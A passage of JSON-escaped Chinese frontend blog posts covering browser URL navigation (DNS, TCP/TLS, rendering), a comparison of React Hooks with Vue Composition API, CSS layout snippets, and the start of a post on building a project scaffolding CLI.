caching)即DNS解析器缓存，是操作系统维护的临时数据库，包含最近的网站和其他Internet域的访问记录。实际，DNS缓存是计算机为了快速响应而把已加载过的资源缓存起来，便于再次访问时可以直接快速引用的技术手段\n(4) 本地DNS服务器：都没有相应的网址映射关系，则会找TCP/IP参数中设置的首选DNS服务器，即本地DNS服务器。若在本地配置区域资源中包含，则返回解析结果给客户机，完成域名解析，此解析具有权威性 (5) 本地DNS服务器缓存：本地DNS服务器服务器缓存包含此网址映射关系，则调用此IP地址映射，完成域名解析。查询的域名不由本地DNS服务器区域解析，则此解析不具有权威性 (6) 本地DNS服务器本地区域文件与缓存解析都失效，则根据本地DNS服务器的设置（是否设置转发器）查询 转发模式: 本地DNS服务器会把请求转发至上一级DNS服务器，由上一级服务器进行解析，上一级服务器若不能解析，则找根DNS或转请求转至上上级，以此循环 根提示：未用转发模式 本地DNS就把请求发至13台根DNS，根DNS服务器收到请求后返回负责该顶级域名服务器的一个IP。 本地DNS服务器收到IP信息，联系负责.com顶级域服务器。其收到请求后，若自己无法解析，则搜索二级域，二级域搜索三级域，直到找到需要解析的地址或名称，向本地DNS服务器发送回复消息。 本地DNS服务器收到回复后存储在缓存中，然后发送解析结果给客户端 无论本地DNS服务器用转发或根提示，最后都把结果返回给本地DNS服务器，本地DNS服务器再返回给客户机。从客户端到本地DNS服务器是属于递归查询，而DNS服务器之间就是的交互查询就是迭代查询\n局部DNS服务器自己不能回答客户机的DNS查询时，就需要向其他DNS服务器进行查询。DNS查询解析的两种方式：\n1、递归查询解析： 如图所示。局部DNS服务器自己负责向其他DNS服务器进行查询，一般是先向该域名的根域服务器查询，再由根域名服务器一级级向下查询。最后得到的查询结果返回给局部DNS服务器，再由局部DNS服务器返回给客户端\n2、迭代解析： 如图所示。局部DNS服务器不是自己向其他DNS服务器进行查询，而是把能解析该域名的其他DNS服务器的IP地址返回给客户端DNS程序，客户端DNS程序再继续向这些DNS服务器进行查询，直到得到查询结果为止。即，迭代解析只帮你找到相关的服务器而已，不会帮你去查\n2.2 TLS连接、TCP连接及断开连接 Gitee-cloud-notes: 计算机网络协议模型\nTLS是在SSL的基础上标准化的产物，目前SSL3.0与TLS1.0保持一致的，二者是并列关系，只是大家习惯称呼SSL\n若为https协议，则需要先建立TLS连接\n主机浏览器通过DNS解析得到了目标服务器的IP地址后，与服务器建立TCP连接\n浏览器发送HTTP请求，服务器接受请求、处理请求、返回响应。然后根据Connection请求头，决定是直接断开TCP连接，还是等浏览器渲染完页面再断开连接:\n如果是keep-alive服务器就保持住tcp连接 如果没有或是close则服务器response传输完后主动关闭tcp连接 现在浏览器都是http1.1都默认是keep-alive的，在浏览器tab关闭时，tcp连接关闭\n2.3 网络进程: 浏览器端发送http请求 Blog: Http请求流程\n建立了TCP连接之后，发起一个http请求。一个典型的 http request header 一般需要包括请求的方法，例如 GET 或者 POST 等，不常用的还有 PUT 和 DELETE 、HEAD、OPTION以及 TRACE 方法\n2.4 网络进程: 服务端返回http响应 Blog: Http请求流程\n服务器接受并处理完请求，返回 HTTP响应，一个响应报文格式基本等同于请求报文，由响应行、响应头、空行、实体组成\n网络进程解析响应头-重定向\n响应头返回的状态码是301或者302，意味着服务器需要浏览器重定向到其他URL。这时网络进程从响应头的Location字段读取重定向的地址，再发起新的HTTP或者HTTPS请求。即重复2.3和2.4的过程\n3、浏览器进程：准备渲染进程 默认情况下，Chrome打开新的⻚面都会使用单独的渲染进程。但也有例外:\n内部有iframe：会另外再划分出单独的渲染进程（站点隔离） 同一站点：如果从A⻚面打开B⻚面，且A和B都属于同一站点的话，那么B⻚面复用A⻚面的渲染进程。官方把这个默认策略叫process-per-site-instance 同一站点：表示根域名下的所有子域名和不同的端口。例如：https://time.geekbang.org、https://www.geekbang.org、https://www.geekbang.org:8080三个域名的协议都是HTTPS，而且根域名也都是geekbang.org\n渲染进程准备好后，此时的文档数据还在网络进程中，并没有提交给渲染进程，所以下一步就进入了提交文档阶段\n4、渲染进程：提交文档 这里的“文档”指URL请求的响应体数据\n浏览器进程发出“提交文档”消息，渲染进程接收到“提交文档”的消息后，会和网络进程建立传输数据的“管道” 等文档数据传输完成后，渲染进程会返回“确认提交”的消息给浏览器进程 浏览器进程收到“确认提交”的消息后，会更新浏览器界面状态，包括了安全状态（黑白名单、跨站攻击等）、地址栏的 URL、前进后退的历史状态，并更新 Web 页面 也解释了为什么在浏览器的地址栏里面输入了一个地址后，之前的⻚面没有立⻢消失，而是要加载一会儿才会更新⻚面\n到此，导航阶段结束，之后进入渲染阶段\n5、渲染阶段：浏览器解析渲染页面 Gitee-cloud-notes: 页面渲染阶段\n浏览器是一个边解析边渲染的过程。首先浏览器解析HTML文件构建DOM树，然后解析CSS文件构建渲染树，等到渲染树构建完成后，浏览器开始布局渲染树并将其绘制到屏幕上。过程比较复杂，涉及两个重要概念:reflow(回流)和repain(重绘)\nDOM节点中的各个元素都是以盒模型的形式存在，这些都需要浏览器去计算其位置和大小等，这个过程称为relow; 当盒模型的位置,大小以及其他属性，如颜色,字体,等确定下来之后，浏览器便开始绘制内容，这个过程称为repain。 页面在首次加载时必然会经历reflow和repain。reflow和repain过程是非常消耗性能的，尤其是在移动设备上，它会破坏用户体验，有时会造成页面卡顿。所以我们应该尽可能少的减少reflow和repain\n浏览器两种渲染方式:\nFirefox使用Geoko——Mozilla自主研发的渲染引擎，Safari和Chrome都使用webkit\nwebkit的主要流程: Geoko的主要流程: 详细介绍请参考：https://www.cnblogs.com/slly/p/6640761.html\n参考文献 从输入url到页面展示到底发生了什么 - 都市烟火 - 博客园 浏览器输入url按下回车后发生了什么 浏览器工作原理与实践.timsrc 最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/computer-basics/chrome-url-navigation-process/","summary":"\u003cp\u003e浏览器输入URL到⻚面展示完整流程主要涉及到：浏览器进程、网络进程和渲染进程。其中\u0026hellip;\u003c/p\u003e","title":"浏览器：导航流程-输入URL到页面展示，中间发生了什么(http)"},{"content":"目录 场景 hook 的时代意义 React Hooks Vue Composition API 差别 总结 场景 先理解\u0026hellip;\n目录\n场景 hook 的时代意义 React Hooks Vue Composition API 差别 总结 场景 先理解什么是hook，拿react的介绍来看，它的定义是：\n它可以让你在不编写 class 的情况下，让你在函数组件里“钩入” React state 及生命周期等特性的函数\n对于 Vue 提出的新的书写 Vue 组件的 API：Composition API RFC，作用也是类似，所以我们也可以像react一样叫做 vue hooks\n该 API 受到 React Hooks 的启发 但有一些有趣的差异，规避了一些react的问题 hook的时代意义 框架是服务于业务的，业务中很难避免的一个问题就是 \u0026ndash; 逻辑复用，同样的功能，同样的组件，在不一样的场合下，我们有时候不得不去写2+次，为了避免耦合，后来各大框架纷纷想出了一些办法，比如 minix, render props, 高阶组件等实现逻辑上的复用，但是都有一些额外的问题\nminix 与组件之间存在隐式依赖，可能产生冲突。倾向于增加更多状态，降低了应用的可预测性 高阶组件 多层包裹嵌套组件，增加了复杂度和理解成本，对于外层是黑盒 Render Props 使用繁琐，不好维护, 代码体积过大，同样容易嵌套过深 \u0026hellip; hook的出现是划时代的，通过function抽离的方式，实现了复杂逻辑的内部封装：\n逻辑代码的复用 减小了代码体积 没有this的烦恼 React Hooks React Hooks 允许你 \u0026ldquo;勾入\u0026rdquo; 诸如组件状态和副作用处理等 React 功能中。Hooks 只能用在函数组件中，并允许我们在不需要创建类的情况下将状态、副作用处理和更多东西带入组件中。\nReact 核心团队奉上的采纳策略是不反对类组件，所以你可以升级 React 版本、在新组件中开始尝试 Hooks，并保持既有组件不做任何更改\n例子：\nimport React, { useState, useEffect } from \u0026#34;react\u0026#34;; const NoteForm = ({ onNoteSent }) =\u0026gt; { const [currentNote, setCurrentNote] = useState(\u0026#34;\u0026#34;); useEffect(() =\u0026gt; { console.log(`Current note: ${currentNote}`); }); return ( \u0026lt;form onSubmit={e =\u0026gt; { onNoteSent(currentNote); setCurrentNote(\u0026#34;\u0026#34;); e.preventDefault(); }} \u0026gt; \u0026lt;label\u0026gt; \u0026lt;span\u0026gt;Note: \u0026lt;/span\u0026gt; \u0026lt;input value={currentNote} onChange={e =\u0026gt; { const val = e.target.value \u0026amp;\u0026amp; e.target.value.toUpperCase()[0]; const validNotes = [\u0026#34;A\u0026#34;, \u0026#34;B\u0026#34;, \u0026#34;C\u0026#34;, \u0026#34;D\u0026#34;, \u0026#34;E\u0026#34;, \u0026#34;F\u0026#34;, \u0026#34;G\u0026#34;]; setCurrentNote(validNotes.includes(val) ? val : \u0026#34;\u0026#34;); }} /\u0026gt; \u0026lt;/label\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34;\u0026gt;Send\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; ); }; useState 和 useEffect 是 React Hooks 中的一些例子，使得函数组件中也能增加状态和运行副作用 还有更多其他 hooks， 甚至能自定义一个，hooks 打开了代码复用性和扩展性的新大门 Vue Composition API Vue Composition API 围绕一个新的组件选项 setup 而创建。setup() 为 Vue 组件提供了状态、计算值、watcher 和生命周期钩子\nAPI 并没有让原来的 API（现在被称作 \u0026ldquo;Options-based API\u0026rdquo;）消失。允许开发者 结合使用新旧两种 APIs。可以在 Vue 2.x 中通过 @vue/composition-api 插件尝试新 API\n例子：\n\u0026lt;template\u0026gt; \u0026lt;form @submit=\u0026#34;handleSubmit\u0026#34;\u0026gt; \u0026lt;label\u0026gt; \u0026lt;span\u0026gt;Note:\u0026lt;/span\u0026gt; \u0026lt;input v-model=\u0026#34;currentNote\u0026#34; @input=\u0026#34;handleNoteInput\u0026#34;\u0026gt; \u0026lt;/label\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34;\u0026gt;Send\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; import { ref, watch } from \u0026#34;vue\u0026#34;; export default { props: [\u0026#34;divRef\u0026#34;], setup(props, context) { const currentNote = ref(\u0026#34;\u0026#34;); const handleNoteInput = e =\u0026gt; { const val = e.target.value \u0026amp;\u0026amp; e.target.value.toUpperCase()[0]; const validNotes = [\u0026#34;A\u0026#34;, \u0026#34;B\u0026#34;, \u0026#34;C\u0026#34;, \u0026#34;D\u0026#34;, \u0026#34;E\u0026#34;, \u0026#34;F\u0026#34;, \u0026#34;G\u0026#34;]; currentNote.value = validNotes.includes(val) ? val : \u0026#34;\u0026#34;; }; const handleSubmit = e =\u0026gt; { context.emit(\u0026#34;note-sent\u0026#34;, currentNote.value); currentNote.value = \u0026#34;\u0026#34;; e.preventDefault(); }; return { currentNote, handleNoteInput, handleSubmit, }; } }; \u0026lt;/script\u0026gt; 差别 原理 React hook 底层是基于链表实现，调用的条件是每次组件被render的时候都会顺序执行所有的hooks，所以下面的代码会报错\nfunction App(){ const [name, setName] = useState(\u0026#39;demo\u0026#39;); if(condition){ const [val, setVal] = useState(\u0026#39;\u0026#39;); } } 因为底层是链表，每一个hook的next是指向下一个hook的，if会导致顺序不正确，从而导致报错，所以react是不允许这样使用hook的。\nvue hook 只会被注册调用一次，vue 能避开这些麻烦的问题，原因在于它对数据的响应是基于proxy的，对数据直接代理观察。这种场景下，只要任何一个更改data的地方，相关的function或者template都会被重新计算，因此避开了react可能遇到的性能上的问题\nreact数据更改的时候，会导致重新render，重新render又会重新把hooks重新注册一次，所以react的上手难度更高一些\n当然react对这些都有自己的解决方案，比如useCallback，useMemo等hook的作用，这些官网都有介绍\n代码的执行 Vue 中，“钩子”就是一个生命周期方法 Vue Composition API 的 setup() 晚于 beforeCreate 钩子，早于 created 钩子被调用 React hooks 会在组件每次渲染时候运行，而 Vue setup() 只在组件创建时运行一次 由于 React hooks 会多次运行，所以 render 方法必须遵守某些规则，比如: 不要在循环内部、条件语句中或嵌套函数里调用 Hooks\n// React 文档中的示例代码： function Form() { // 1. Use the name state variable const [name, setName] = useState(\u0026#39;Mary\u0026#39;); // 2. Use an effect for persisting the form if (name !== \u0026#39;\u0026#39;) { useEffect(function persistForm() { localStorage.setItem(\u0026#39;formData\u0026#39;, name); }); } // 3. Use the surname state variable const [surname, setSurname] = useState(\u0026#39;Poppins\u0026#39;); // 4. Use an effect for updating the title useEffect(function updateTitle() { document.title = `${name} ${surname}`; }); // ... } 如果想要在 name 为空时也运行对应的副作用, 可以简单的将条件判断语句移入 useEffect 回调内部：\nuseEffect(function persistForm() { if (name !== \u0026#39;\u0026#39;) { localStorage.setItem(\u0026#39;formData\u0026#39;, name); } }); 对于以上的实现，Vue 写法如下：\nexport default { setup() { // 1. Use the name state variable const name = ref(\u0026#34;Mary\u0026#34;); // 2. Use a watcher for persisting the form if(name.value !== \u0026#39;\u0026#39;) { watch(function persistForm() =\u0026gt; { localStorage.setItem(\u0026#39;formData\u0026#39;, name.value); }); } // 3. Use the surname state variable const surname = ref(\u0026#34;Poppins\u0026#34;); // 4. Use a watcher for updating the title watch(function updateTitle() { document.title = `${name.value} ${surname.value}`; }); } } Vue 中 setup() 只会运行一次，可以将 Composition API 中不同的函数 (reactive、ref、computed、watch、生命周期钩子等) 作为循环或条件语句的一部分\n但 if 语句 和 react hooks 一样只运行一次，所以它在 name 改变时也无法作出反应，除非我们将其包含在 watch 回调的内部\nwatch(function persistForm() =\u0026gt; { if(name.value !== \u0026#39;\u0026#39;) { localStorage.setItem(\u0026#39;formData\u0026#39;, name.value); } }); 声明状态(Declaring state) react useState 是 React Hooks 声明状态的主要途径\n可以向调用中传入一个初始值作为参数 如果初始值的计算代价比较昂贵，也可以将其表达为一个函数，就只会在初次渲染时才会被执行 useState() 返回一个数组，第一项是 state，第二项是一个 setter 函数\nconst [name, setName] = useState(\u0026#34;Mary\u0026#34;); const [age, setAge] = useState(25); console.log(`${name} is ${age} years old.`); useReducer 是个有用的替代选择，其常见形式是接受一个 Redux 样式的 reducer 函数和一个初始状态：\nconst initialState = {count: 0}; function reducer(state, action) { switch (action.type) { case \u0026#39;increment\u0026#39;: return {count: state.count + 1}; case \u0026#39;decrement\u0026#39;: return {count: state.count - 1}; default: throw new Error(); } } const [state, dispatch] = useReducer(reducer, initialState); dispatch({type: \u0026#39;increment\u0026#39;}); // state 就会变为 {count: 1} useReducer 还有一种 延迟初始化 的形式，传入一个 init 函数作为第三个参数\nVue Vue 使用两个主要的函数来声明状态：ref 和 reactive。\nref() 返回一个反应式对象，其内部值可通过其 value 属性被访问到。可以将其用于基本类型，也可以用于对象\nconst name = ref(\u0026#34;Mary\u0026#34;); const age = ref(25); watch(() =\u0026gt; { console.log(`${name.value} is ${age.value} years old.`); }); reactive() 只将一个对象作为其输入并返回一个对其的反应式代理\nconst state = reactive({ name: \u0026#34;Mary\u0026#34;, age: 25, }); watch(() =\u0026gt; { console.log(`${state.name} is ${state.age} years old.`); }); 注意：\n使用 ref 时需要 用 value 属性访问其包含的值（除非在 template 中，Vue 允许你省略它） 用 reactive 时，要注意如果使用了对象解构（destructure），会失去其反应性。所以需要定义一个指向对象的引用，并通过其访问状态属性。 总结使用这两个函数的处理方式：\n像在正常的 JavaScript 中声明基本类型变量和对象变量那样去使用 ref 和 reactive 即可 只要用到 reactive 的时候，要记住从 composition 函数中返回反应式对象时得使用 toRefs()。这样做减少了过多使用 ref 时的开销 // toRefs() 则将反应式对象转换为普通对象，该对象上的所有属性都自动转换为 ref function useFeatureX() { const state = reactive({ foo: 1, bar: 2 }) return toRefs(state) } const {foo, bar} = useFeatureX(); 如何跟踪依赖(How to track dependencies) React 中的 useEffect hook 允许在每次渲染之后运行某些副作用（如请求数据或使用 storage 等 Web APIs），并在下次执行回调之前或当组件卸载时运行一些清理工作\n默认情况下，所有用 useEffect 注册的函数都会在每次渲染之后运行，但可以定义真实依赖的状态和属性，以使 React 在相关依赖没有改变的情况下（如由 state 中的其他部分引起的渲染）跳过某些 useEffect hook 执行\n// 传递一个依赖项的数组作为 useEffect hook 的第二个参数，只有当 name 改变时才会更新 localStorage function Form() { const [name, setName] = useState(\u0026#39;Mary\u0026#39;); const [surname, setSurname] = useState(\u0026#39;Poppins\u0026#39;); useEffect(function persistForm() { localStorage.setItem(\u0026#39;formData\u0026#39;, name); }, [name]); // ... } 显然，使用 React Hooks 时忘记在依赖项数组中详尽地声明所有依赖项很容易发生，会导致 useEffect 回调 \u0026ldquo;以依赖和引用了上一次渲染的陈旧数据而非最新数据\u0026rdquo; 从而无法被更新而告终\n解决方案：\neslint-plugin-react-hooks 包含了一条 lint 提示关于丢失依赖项的规则 useCallback 和 useMemo 也使用依赖项数组参数，以分别决定其是否应该返回缓存过的（ memoized）与上一次执行相同的版本的回调或值。 在 Vue Composition API 的情况下，可以使用 watch() 执行副作用以响应状态或属性的改变。依赖会被自动跟踪，注册过的函数也会在依赖改变时被反应性的调用\nexport default { setup() { const name = ref(\u0026#34;Mary\u0026#34;); const lastName = ref(\u0026#34;Poppins\u0026#34;); watch(function persistForm() =\u0026gt; { localStorage.setItem(\u0026#39;formData\u0026#39;, name.value); }); } } 访问组件生命周期(Access to the lifecycle of the component) Hooks 在处理 React 组件的生命周期、副作用和状态管理时表现出了心理模式上的完全转变。 React 文档中也指出：\n如果你熟悉 React 类生命周期方法，那么可以将 useEffect Hook 视为 componentDidMount、componentDidUpdate 及 componentWillUnmount 的合集\nuseEffect(() =\u0026gt; { console.log(\u0026#34;This will only run after initial render.\u0026#34;); return () =\u0026gt; { console.log(\u0026#34;This will only run when component will unmount.\u0026#34;); }; }, []); 强调的是，使用 React Hooks 时停止从生命周期方法的角度思考，而是考虑副作用依赖什么状态，才更符合习惯\nVue Component API 通过 onMounted、onUpdated 和 onBeforeUnmount：\nsetup() { onMounted(() =\u0026gt; { console.log(`This will only run after initial render.`); }); onBeforeUnmount(() =\u0026gt; { console.log(`This will only run when component will unmount.`); }); } 故在 Vue 的情况下的心理模式转变更多在停止通过组件选项（data、computed, watch、methods、生命周期钩子等）管理代码，要转向用不同函数处理对应的特性\n自定义代码(Custom code) React 团队聚焦于 Hooks 上的原因之一，Custom Hooks 是可以替代之前社区中采纳的诸如 Higher-Order Components 或 Render Props 等提供给开发者编写可复用代码的，一种更优秀的方式\nCustom Hooks 就是普通的 JavaScript 函数，在其内部利用了 React Hooks。它遵守的一个约定是其命名应该以 use 开头，以明示这是被用作一个 hook 的。\n// custom hook - 用于当 value 改变时向控制台打印日志 export function useDebugState(label, initialValue) { const [value, setValue] = useState(initialValue); useEffect(() =\u0026gt; { console.log(`${label}: `, value); }, [label, value]); return [value, setValue]; } // 调用 const [name, setName] = useDebugState(\u0026#34;Name\u0026#34;, \u0026#34;Mary\u0026#34;); Vue 中，组合式函数（Composition Functions）与 Hooks 在逻辑提取和重用的目标上是一致的在 Vue 中实现一个类似的 useDebugState 组合式函数\nexport function useDebugState(label, initialValue) { const state = ref(initialValue); watch(() =\u0026gt; { console.log(`${label}: `, state.value); }); return state; } // elsewhere: const name = useDebugState(\u0026#34;Name\u0026#34;, \u0026#34;Mary\u0026#34;); 注意：根据约定，组合式函数也像 React Hooks 一样使用 use 作为前缀以明示作用，并且表面该函数用于 setup() 中\nRefs React 的 useRef 和 Vue 的 ref 都允许你引用一个子组件 或 要附加到的 DOM 元素。\nReact：\nconst MyComponent = () =\u0026gt; { const divRef = useRef(null); useEffect(() =\u0026gt; { console.log(\u0026#34;div: \u0026#34;, divRef.current) }, [divRef]); return ( \u0026lt;div ref={divRef}\u0026gt; \u0026lt;p\u0026gt;My div\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; ) } Vue:\nexport default { setup() { const divRef = ref(null); onMounted(() =\u0026gt; { console.log(\u0026#34;div: \u0026#34;, divRef.value); }); return () =\u0026gt; ( \u0026lt;div ref={divRef}\u0026gt; \u0026lt;p\u0026gt;My div\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; ) } } 附加的函数(Additional functions) React Hooks 在每次渲染时都会运行，没有 一个等价于 Vue 中 computed 函数的方法。所以你可以自由地声明一个变量，其值基于状态或属性，并将指向每次渲染后的最新值：\nconst [name, setName] = useState(\u0026#34;Mary\u0026#34;); const [age, setAge] = useState(25); const description = `${name} is ${age} years old`; Vue 中，setup() 只运行一次。因此需要定义计算属性，其应该观察某些状态更改并作出相应的更新：\nconst name = ref(\u0026#34;Mary\u0026#34;); const age = ref(25); const description = computed(() =\u0026gt; `${name.value} is ${age.value} years old`); 计算一个值开销比较昂贵。你不会想在组件每次渲染时都计算它。React 包含了针对这点的 useMemo hook：\nfunction fibNaive(n) { if (n \u0026lt;= 1) return n; return fibNaive(n - 1) + fibNaive(n - 2); } const Fibonacci = () =\u0026gt; { const [nth, setNth] = useState(1); const nthFibonacci = useMemo(() =\u0026gt; fibNaive(nth), [nth]); return ( \u0026lt;section\u0026gt; \u0026lt;label\u0026gt; Number: \u0026lt;input type=\u0026#34;number\u0026#34; value={nth} onChange={e =\u0026gt; setNth(e.target.value)} /\u0026gt; \u0026lt;/label\u0026gt; \u0026lt;p\u0026gt;nth Fibonacci number: {nthFibonacci}\u0026lt;/p\u0026gt; \u0026lt;/section\u0026gt; ); }; React 建议你使用 useMemo 作为一个性能优化手段, 而非一个任何一个依赖项改变之前的缓存值\nReact advice you to use useMemo as a performance optimization and not as a guarantee that the value will remain memoized\nVue 的 computed 执行自动的依赖追踪，所以它不需要一个依赖项数组\nContext 和 provide/inject React 中的 useContext hook，可以作为一种读取特定上下文当前值的新方式。返回的值通常由最靠近的一层 \u0026lt;MyContext.Provider\u0026gt; 祖先树的 value 属性确定\n// context object const ThemeContext = React.createContext(\u0026#39;light\u0026#39;); // provider \u0026lt;ThemeContext.Provider value=\u0026#34;dark\u0026#34;\u0026gt; // consumer const theme = useContext(ThemeContext); Vue 中类似的 API 叫 provide/inject。在 Vue 2.x 中作为组件选项存在，在 Composition API 中增加了一对用在 setup() 中的 provide 和 inject 函数：\n// key to provide const ThemeSymbol = Symbol(); // provider provide(ThemeSymbol, ref(\u0026#34;dark\u0026#34;)); // consumer const value = inject(ThemeSymbol); 如果你想保持反应性，必须明确提供一个 ref/reactive 作为值\n在渲染上下文中暴露值(Exposing values to render context) 在 React 的情况下 所有 hooks 代码都在组件中定义 且你将在同一个函数中返回要渲染的 React 元素 所以你对作用域中的任何值拥有完全访问能力，就像在任何 JavaScript 代码中的一样：\nconst Fibonacci = () =\u0026gt; { const [nth, setNth] = useState(1); const nthFibonacci = useMemo(() =\u0026gt; fibNaive(nth), [nth]); return ( \u0026lt;section\u0026gt; \u0026lt;label\u0026gt; Number: \u0026lt;input type=\u0026#34;number\u0026#34; value={nth} onChange={e =\u0026gt; setNth(e.target.value)} /\u0026gt; \u0026lt;/label\u0026gt; \u0026lt;p\u0026gt;nth Fibonacci number: {nthFibonacci}\u0026lt;/p\u0026gt; \u0026lt;/section\u0026gt; ); }; Vue 的情况下 第一，在 template 或 render 选项中定义模板 第二，使用单文件组件，就要从 setup() 中返回一个包含了你想输出到模板中的所有值的对象 由于要暴露的值很可能过多，返回语句也容易变得冗长\n\u0026lt;template\u0026gt; \u0026lt;section\u0026gt; \u0026lt;label\u0026gt; Number: \u0026lt;input type=\u0026#34;number\u0026#34; v-model=\u0026#34;nth\u0026#34; /\u0026gt; \u0026lt;/label\u0026gt; \u0026lt;p\u0026gt;nth Fibonacci number: {{nthFibonacci}}\u0026lt;/p\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; export default { setup() { const nth = ref(1); const nthFibonacci = computed(() =\u0026gt; fibNaive(nth.value)); return { nth, nthFibonacci }; } }; \u0026lt;/script\u0026gt; } 要达到 React 同样简洁表现的一种方式是从 setup() 自身中返回一个渲染函数。不过，模板在 Vue 中是更常用的一种做法，所以暴露一个包含值的对象，是你使用 Vue Composition API 时必然会多多遭遇的情况。\n总结(Conclusion) React 和 Vue都有属于属于自己的“惊喜”，无优劣之分，自 React Hooks 在 2018 年被引入，社区利用其产出了很多优秀的作品，自定义 Hooks 的可扩展性也催生了许多开源贡献。\nVue 受 React Hooks 启发将其调整为适用于自己框架的方式，这也成为这些不同的技术如何拥抱变化且分享灵感和解决方案的成功案例\n参考 Composition API RFC React hooks Comparing React Hooks with Vue Composition API 最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/frontend-develop/react-hooks-compare-vue-composition-api/","summary":"\u003cp\u003e目录 场景 hook 的时代意义 React Hooks Vue Composition API 差别 总结 场景 先理解\u0026hellip;\u003c/p\u003e","title":"对比 React Hooks 和 Vue Composition API"},{"content":"项目开发中，经常遇到页面布局和样式的一些问题，最近做了一些梳理\u0026hellip;\n一、CSS 1. 左右div元素自适应等高 通常有以下4种方式: table-cell、CSS3盒模型、相对布局和float\n基础代码 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;demo\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;wrap\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;item left\u0026#34;\u0026gt;111\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;item right\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 方式1: table-cell /* 此种写法关键点: 1. item设置display table-cell table-cell存在问题: 1. table-cell是把元素当做table的td处理, 所以设置之后.left设置的min-height不起作用,只能靠元素本身撑起整个高度 2. table-cell有兼容问题, ie8以上 */ \u0026lt;style\u0026gt; .wrap { width: 1200px; } .item { width: 300px; display: table-cell; } .right { width: 800px; background-color: #6accd5; } .left { padding-top: 20px; /*min-height: 200px;*/ background-color: #e17b4e; } \u0026lt;/style\u0026gt; 方式2: CSS3盒模型 /* 此种写法关键点: 1. 父元素.wrap设置display -webkit-box */ \u0026lt;style\u0026gt; .wrap { display: -webkit-box; width: 1200px; } .left{ width: 200px; min-height: 200px; background-color: #e17b4e; } .right { width: 800px; padding: 10px; background-color: #6accd5; } \u0026lt;/style\u0026gt; 方式3: 相对布局 —— 第一种要重点理解的方法 /* 此种写法的关键点有三: 1. wrap 的position须设为absolute/relative, 为了让right的相对布局对象为父class wrap 2. right 设置 absolute, top \u0026amp; bottom 设置为0, 撑起父元素height, right为0, 靠右侧 3. 整个布局最小height为.left min-height, 随着.left内元素增加, 左右等高 */ \u0026lt;style\u0026gt; .wrap { width: 1200px; position: absolute; /*position: relative;*/ } .item { width: 300px; display: inline-block; } .right { width: 800px; position: absolute; top: 0; bottom: 0; right: 0; background-color: #6accd5; } .left { min-height: 200px; background-color: #e17b4e; } \u0026lt;/style\u0026gt; 方式4: float —— 第二种要重点理解的方法 /* 此种写法的关键点有三： 1. .wrap设置display: absolute 继承父元素(body)， 在子元素.right设置absolute时，相对的元素是.wrap而不是整个body 2. .wrap子元素设置float, 本身变成inline元素, 没有height, 通过设置display: absolute或者overflow: hidden, 可以让.wrap重新变成block元素 3. 子元素height设为100% 注：相对定位和overflow: hidden是怎么实现元素block的，查询参考BFC和IFC */ \u0026lt;style\u0026gt; .wrap { width: 1200px; position:absolute; /*overflow: hidden;*/ background-color: rgba(0, 0, 0, 0.2); } .left { float: left; width: 50%; background-color: #e17b4e; height: 100%; min-height: 300px; } .right { float: left; width: 30%; height: 100%; position: absolute; left: 55%; background-color: #6accd5; } .right:after{ clear: both; } \u0026lt;/style\u0026gt; 十、常见问题 1. WARN [vite:css] xxx value has mixed support, consider using xxx instead 详细错误提示信息:\nlianpf@lianpf-PC:~/despository-z/framework/wenhao-testapp$ yarn serve yarn run v1.22.22 $ zmi serve [10:53:49.866] INFO (28799): 正在加载presets: h5 ➜ Local: http://localhost:5173/ 10:53:50 ➜ Network: http://10.10.138.3:5173/ 10:53:50 WARN [vite:css] end value has mixed support, consider using flex-end instead 解法： 如果您使用(S)CSS或SASS，则必须分别编写flex-start或flex-end而不是start或end\njustify-content: flex-end; align-items: flex-end; 参考 start value has mixed support, consider using flex-start instead\n最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/frontend-develop/css-codefragment/","summary":"项目开发中，经常遇到页面布局和样式的一些问题，最近做了一些梳","title":"代码片段: html/css/less/sass"},{"content":"本篇是前端工程化之依托模板搭建企业级脚手架(cli)。通过脚手架，我们可以快速初始化一个项目，无需自己从零开始一步步\u0026hellip;\n一、背景 1.为什么 通过脚手架，我们可以快速初始化一个项目，无需自己从零开始一步步配置，有效提升开发体验。\n当然，社区已经贡献了vue-cli、create-react-app、react-native-cli等非常优秀的脚手架，\n但是，这些脚手架未必完全符合我们的实际应用，特别是作为企业通用脚手架而言，所以我们需要定制自己的脚手架，来提升开发效率。\n2.脚手架的作用 减少重复性工作：不需要复制其他项目再删除无关代码，或者从零创建一个项目和文件。 多套模板：可以根据交互动态生成项目结构和配置文件。 协作：多人协作更为方便，不需要把文件传来传去。 本项目完整代码地址，在文章末尾。\n二、提供的功能 明确脚手架（@lianpf/create-app-cli）需要提供的功能：\nca init \u0026lt;template-name\u0026gt; 